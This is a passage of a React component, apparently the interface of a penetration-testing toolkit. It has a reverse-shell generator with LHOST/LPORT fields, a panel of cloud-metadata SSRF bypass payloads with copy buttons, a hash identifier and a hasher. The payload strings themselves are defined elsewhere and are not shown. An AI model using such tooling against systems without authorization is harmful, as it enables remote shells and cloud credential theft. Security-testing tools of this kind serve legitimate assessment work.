            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8, padding: 10, background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r)" }}>
              <div>
                <label style={{ display: "block", fontSize: 10.5, fontWeight: 700, color: "var(--fg-3)", marginBottom: 4 }}>LHOST</label>
                <input
                  type="text"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12, fontFamily: "var(--font-mono)" }}
                />
              </div>
              <div>
                <label style={{ display: "block", fontSize: 10.5, fontWeight: 700, color: "var(--fg-3)", marginBottom: 4 }}>LPORT</label>
                <input
                  type="text"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12, fontFamily: "var(--font-mono)" }}
                />
              </div>
              <div>
                <label style={{ display: "block", fontSize: 10.5, fontWeight: 700, color: "var(--fg-3)", marginBottom: 4 }}>SHELL</label>
                <select
                  value={shellType}
                  onChange={(e) => setShellType(e.target.value)}
                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12 }}
                >
                  <option value="/bin/bash">/bin/bash</option>
                  <option value="/bin/sh">/bin/sh</option>
                  <option value="/bin/zsh">/bin/zsh</option>
                </select>
              </div>
            </div>

            {/* Shell Cards */}
            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {reverseShells.map((sh, idx) => (
                <div
                  key={idx}
                  style={{
                    background: "var(--bg-1)",
                    border: "1px solid var(--border)",
                    borderRadius: "var(--r-sm)",
                    padding: "10px 12px",
                    display: "flex",
                    flexDirection: "column",
                    gap: 6
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: 12, fontWeight: 700, color: "var(--fg)" }}>
                      {sh.name}
                    </span>
                    <button
                      onClick={() => copyToClipboard(sh.cmd, `shell_${idx}`)}
                      className="btn-secondary"
                      style={{ padding: "2px 8px", fontSize: 10.5, display: "flex", alignItems: "center", gap: 4 }}
                    >
                      {copiedId === `shell_${idx}` ? <Check size={11} /> : <Copy size={11} />}
                      {copiedId === `shell_${idx}` ? "Copied" : "Copy"}
                    </button>
                  </div>
                  <div style={{
                    padding: "6px 8px",
                    background: "rgba(0,0,0,0.3)",
                    border: "1px solid var(--border)",
                    borderRadius: 4,
                    fontFamily: "var(--font-mono)",
                    fontSize: 11,
                    color: "var(--sev-low)",
                    wordBreak: "break-all"
                  }}>
                    {sh.cmd}
                  </div>
                  <div style={{ fontSize: 10.5, color: "var(--fg-3)" }}>
                    {sh.desc}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Right: SSRF & Cloud Metadata */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18, overflowY: "auto" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                Cloud Metadata & SSRF Bypasses
              </h2>
              <span style={{ fontSize: 11, color: "var(--fg-3)" }}>IMDSv1, GCP, Azure & filter evasions</span>
            </div>

            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {ssrfPayloads.map((item, idx) => (
                <div
                  key={idx}
                  style={{
                    background: "var(--bg-1)",
                    border: "1px solid var(--border)",
                    borderRadius: "var(--r-sm)",
                    padding: "10px 12px",
                    display: "flex",
                    flexDirection: "column",
                    gap: 6
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: 12, fontWeight: 700, color: "var(--sev-critical)" }}>
                      {item.provider}
                    </span>
                    <button
                      onClick={() => copyToClipboard(item.target, `ssrf_${idx}`)}
                      className="btn-secondary"
                      style={{ padding: "2px 8px", fontSize: 10.5, display: "flex", alignItems: "center", gap: 4 }}
                    >
                      {copiedId === `ssrf_${idx}` ? <Check size={11} /> : <Copy size={11} />}
                      {copiedId === `ssrf_${idx}` ? "Copied" : "Copy Target"}
                    </button>
                  </div>
                  <div style={{
                    padding: "6px 8px",
                    background: "rgba(0,0,0,0.3)",
                    border: "1px solid var(--border)",
                    borderRadius: 4,
                    fontFamily: "var(--font-mono)",
                    fontSize: 11,
                    color: "var(--fg)",
                    wordBreak: "break-all"
                  }}>
                    {item.target}
                  </div>
                  <div style={{ fontSize: 10.5, color: "var(--fg-3)" }}>
                    {item.desc}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* TAB CONTENT: HASHER & IDENTIFIER */}
      {activeTab === "hasher" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
          {/* Left: Hash Identifier */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                Hash Algorithm Identifier
              </h2>
              <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Heuristic pattern analysis</span>
            </div>

            <div>
              <label style={{ display: "block", fontSize: 11, fontWeight: 600, color: "var(--fg-3)", textTransform: "uppercase", marginBottom: 6 }}>
                Paste Hash String
              </label>
              <input
                type="text"
                value={hashInput}
                onChange={(e) => setHashInput(e.target.value)}
                style={{
                  width: "100%",
                  padding: "8px 12px",
                  background: "var(--bg-1)",
                  border: "1px solid var(--border)",
                  borderRadius: "var(--r)",
                  color: "var(--fg)",
                  fontSize: 12.5,
                  fontFamily: "var(--font-mono)"
                }}
                placeholder="Paste MD5, SHA-256, bcrypt, NTLM hash..."
              />
            </div>

            <div style={{ padding: 14, background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r)", display: "flex", flexDirection: "column", gap: 10 }}>
              <div style={{ fontSize: 11, fontWeight: 700, color: "var(--fg-3)", textTransform: "uppercase" }}>
                Detected Algorithms / Candidates:
              </div>
              <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                {identifiedType.length === 0 ? (
                  <span style={{ fontSize: 11.5, color: "var(--fg-3)" }}>Enter a hash above to identify candidate algorithms...</span>
                ) : (
                  identifiedType.map((t, idx) => (
                    <span
                      key={idx}
                      style={{
                        padding: "4px 10px",
                        borderRadius: "var(--r-sm)",
                        fontSize: 12,
                        fontWeight: 700,
                        background: t.includes("Unknown") ? "var(--bg-3)" : "rgba(16, 185, 129, 0.15)",
                        color: t.includes("Unknown") ? "var(--fg-3)" : "var(--sev-low)",
                        border: `1px solid ${t.includes("Unknown") ? "var(--border)" : "var(--sev-low-bd)"}`
                      }}
                    >
                      {t}
                    </span>
                  ))
                )}
              </div>
              <div style={{ fontSize: 11, color: "var(--fg-3)", marginTop: 4 }}>
                Hash Length: <strong>{hashInput.trim().length}</strong> characters
              </div>
            </div>
          </div>

          {/* Right: Instant Multi-Hasher */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                Instant Cryptographic Hasher
              </h2>
              <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Client-side WebCrypto API</span>
            </div>

            <div>
              <label style={{ display: "block", fontSize: 11, fontWeight: 600, color: "var(--fg-3)", textTransform: "uppercase", marginBottom: 6 }}>
                Input Plaintext String
              </label>
              <input
                type="text"
                value={textToHash}
                onChange={(e) => setTextToHash(e.target.value)}
                style={{
                  width: "100%",
                  padding: "8px 12px",
                  background: "var(--bg-1)",
                  border: "1px solid var(--border)",
                  borderRadius: "var(--r)",
                  color: "var(--fg)",
                  fontSize: 12.5,
                  fontFamily: "var(--font-mono)"
                }}
                placeholder="Enter string to hash (e.g. admin, password)..."
              />
            </div>

            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {Object.entries(generatedHashes).map(([algo, hashVal]) => (
                <div
                  key={algo}
                  style={{
                    background: "var(--bg-1)",
                    border: "1px solid var(--border)",
                    borderRadius: "var(--r-sm)",
                    padding: "8px 12px",
                    display: "flex",
                    flexDirection: "column",
                    gap: 4
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: 11, fontWeight: 700, color: "var(--fg-2)" }}>
                      {algo}
                    </span>
                    <button
                      onClick={() => copyToClipboard(hashVal, `hash_${algo}`)}
                      style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 10.5, display: "flex", alignItems: "center", gap: 4 }}
                    >
                      {copiedId === `hash_${algo}` ? <Check size={11} /> : <Copy size={11} />} Copy
                    </button>
                  </div>
                  <div style={{
                    fontSize: 11,
                    fontFamily: "var(--font-mono)",
                    color: "var(--fg)",
                    wordBreak: "break-all"
                  }}>
                    {hashVal}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
